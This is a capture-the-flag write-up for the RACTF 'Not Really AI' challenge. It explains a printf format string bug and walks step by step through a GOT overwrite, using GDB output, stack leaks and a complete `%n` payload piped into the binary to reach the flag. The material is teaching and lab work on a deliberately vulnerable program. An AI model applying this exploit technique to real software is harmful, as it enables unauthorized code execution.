---
title: Not Really AI - RA CTF 
date: '2020-06-08T07:22:58.064Z'
enableToc: false
description: "This is a Binary exploitaion challenge, based around a format string vulnerability."
tags:
- pwn
---

- Misusage of the libc `printf()` function can lead to serious information leakage and even code execution.
- when we pass one argument (for example `printf(foo)`) we can:
  - leak stack addresses using `%x` or `%p` format specifiers.
  - overwrite any pointer's value using `%n` specifier (note that we can't overwrite plain stack addresses as the %n format specifier can only overwrite by reference and not by value)

For more information on format strings please check [this awesome resource](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf)


## Analyzing the Binary
we fire up GDB and list all our functions:
```c
gef➤  info functions       
All defined functions: 
Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  fgets@plt
0x08049050  getegid@plt
0x08049060  puts@plt
0x08049070  system@plt
0x08049080  __libc_start_main@plt
0x08049090  setvbuf@plt
0x080490a0  setresgid@plt
0x080490b0  _start
0x080490f0  _dl_relocate_static_pie
0x08049100  __x86.get_pc_thunk.bx
0x08049110  deregister_tm_clones
0x08049150  register_tm_clones
0x08049190  __do_global_dtors_aux
0x080491c0  frame_dummy
0x080491c2  response
0x08049245  flaggy
0x08049270  main
0x080492eb  __x86.get_pc_thunk.ax
0x080492f0  __libc_csu_init
0x08049350  __libc_csu_fini
0x08049351  __x86.get_pc_thunk.bp
0x08049358  _fini
```

we notice three non-standard functions above which are: 
```c
0x080491c2  response
0x08049245  flaggy
0x08049270  main
```
by inspecting the disassembly for these three functions we find out that:
- main function will call response function
- response function maybe vulnerable to a format string vulnerability (since there is a printf call)
- the flaggy function is a dead code, our goal is to call it.

so let's start by running some input on the binary, let's test with a couple of `%x`'s:
```
hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra
How are you finding RACTF?
%x %x %x %x    
I am glad you
200 f7fb9580 80491d1 25207825

We hope you keep going!
```
bingo!
we can leak stack addresses.

## Exploitation
since this binary is vulnerable to a format strings attack, we can use the `%n` specifer to overwrite any pointer value on the stack.
But can we really overwrite the return address?
The answer is No, we can't do that since it is not a pointer, it's a value and we can't overwrite values on the stack using `%n`

Our approach to this challenge will be through overwriting the "Global Offset Table"...
to put it simply, the Global Offset Table is somewhere in the bss section of the binary where shared library functions are mapped to their addresses.
If we can overwrite one of these function addresses (for example `puts()` GOT address) then, when we want to execute this function (the `puts`) it will instead execute our arbitary function.

we check our vulnrable function for candiadtes:
```c
gef➤  disas response 
Dump of assembler code for function response:
   0x080491c2 <+0>:     push   ebp
   0x080491c3 <+1>:     mov    ebp,esp
   0x080491c5 <+3>:     push   ebx
   0x080491c6 <+4>:     sub    esp,0x204
   0x080491cc <+10>:    call   0x8049100 <__x86.get_pc_thunk.bx>
   0x080491d1 <+15>:    add    ebx,0x2e2f
   0x080491d7 <+21>:    sub    esp,0xc
   0x080491da <+24>:    lea    eax,[ebx-0x1ff8]
   0x080491e0 <+30>:    push   eax
   0x080491e1 <+31>:    call   0x8049060 <puts@plt>
   0x080491e6 <+36>:    add    esp,0x10
   0x080491e9 <+39>:    mov    eax,DWORD PTR [ebx-0x8]
   0x080491ef <+45>:    mov    eax,DWORD PTR [eax]
   0x080491f1 <+47>:    sub    esp,0x4
   0x080491f4 <+50>:    push   eax
   0x080491f5 <+51>:    push   0x200
   0x080491fa <+56>:    lea    eax,[ebp-0x208]
   0x08049200 <+62>:    push   eax
   0x08049201 <+63>:    call   0x8049040 <fgets@plt>
   0x08049206 <+68>:    add    esp,0x10
   0x08049209 <+71>:    sub    esp,0xc
   0x0804920c <+74>:    lea    eax,[ebx-0x1fdd]
   0x08049212 <+80>:    push   eax
   0x08049213 <+81>:    call   0x8049060 <puts@plt>
   0x08049218 <+86>:    add    esp,0x10
   0x0804921b <+89>:    sub    esp,0xc
   0x0804921e <+92>:    lea    eax,[ebp-0x208]
   0x08049224 <+98>:    push   eax
   0x08049225 <+99>:    call   0x8049030 <printf@plt>
   0x0804922a <+104>:   add    esp,0x10
   0x0804922d <+107>:   sub    esp,0xc
   0x08049230 <+110>:   lea    eax,[ebx-0x1fcf]
   0x08049236 <+116>:   push   eax
   0x08049237 <+117>:   call   0x8049060 <puts@plt>
   0x0804923c <+122>:   add    esp,0x10
   0x0804923f <+125>:   nop
   0x08049240 <+126>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049243 <+129>:   leave  
   0x08049244 <+130>:   ret    
End of assembler dump.
```
we see a `puts` call after the vulnerable `printf` function, that's our candiadte.
Alright, now it's time to collect all the pieces of the puzzle.

In order to start writing our exploit, we will need two pieces of information:
1. The memory address we are overwriting --> puts GOT address
2. The memory address we are overwriting with --> flaggy

to get the puts GOT address we can disassemble the puts address located at response<+117>:
```c
gef➤  disas 0x8049060
Dump of assembler code for function puts@plt:
   0x08049060 <+0>:     jmp    DWORD PTR ds:0x804c018
   0x08049066 <+6>:     push   0x18
   0x0804906b <+11>:    jmp    0x8049020
End of assembler dump.
```
then we examine the destination address of the jump instrcution above to make sure its the GOT address:
```c
gef➤  x 0x804c018
0x804c018 <puts@got.plt>:       0x08049066
```
and voila, `0x804c018` is our desired address!

now we need the flaggy function address:
```c
gef➤  x flaggy
0x8049245 <flaggy>:     0x53e58955
```
and our address is `0x8049245`
(note: don't confuse the address with its value, i.e: in the above snippet we have two hex numbers where `0x8049245` is the address/pointer and `0x53e58955` is the value of that pointer/address)

### Time to write our Exploit!

our exploit will look like this (Abstracted):
`[Address_of_puts][Address_of_flaggy][Address_of_puts entry number on the stack]`
let's dig a bit deeper into each of these parts:
___
1. `[Address_of_puts]:`
  this is the simplest of the three, and it's basically our GOT puts address which we obtained above, but encoded in little endian
  ```
  Address_of_puts = \x18\xc0\x04\x08 
  ```
  ___
2. `[Address_of_flaggy]:`
if we recall back, we mentioned that the %n specifier will write the printed character length to a specified pointer.
our goal here is to encode the Address of flaggy function as a padded address, for example we want to encode this address `0x8049245`
the format will be: `%(integer value of the address - 4)x` where the 4 is the length of the [Address_of_puts]
using any calculator or just python, we can calculate the integer value of any hex address:
```python
>>> int(0x8049245 - 4)
134517313
```
so our final payload will be: `%134517313x`
___
3. `[Address_of_puts entry number on the stack]:`
to calculate the offset of puts in our printf stack leak, we use an Egg i.e: AAAA, and follow it with some `%x`'s until we can locate it's offset.
```
hegz@hegzbox:~/ractf/Not_Really_AI$ ./nra 
How are you finding RACTF?
AAAA %x %x %x %x %x %x %x %x
I am glad you
AAAA 200 f7fb9580 80491d1 41414141 20782520 25207825 78252078 20782520
```
we see that our offset is the 4th entry after the egg, so our payload will be: `%x %x %x %n` or we can use the special feautre of printf `%4$n` which does the same thing.
___
full payload:
`\x18\xc0\x04\x08%134517313x%4$n`

we will use echo to print and pipe it to the binary (we also escape the $ and append a \x0a for a newline):
`echo -en \x18\xc0\x04\x08%134517313x%4\\$n\x0a | ./nra`
a lot of blank spaces will be printed, and eventually our flag...
`ractf{f0rmat_Str1nG_fuN}`

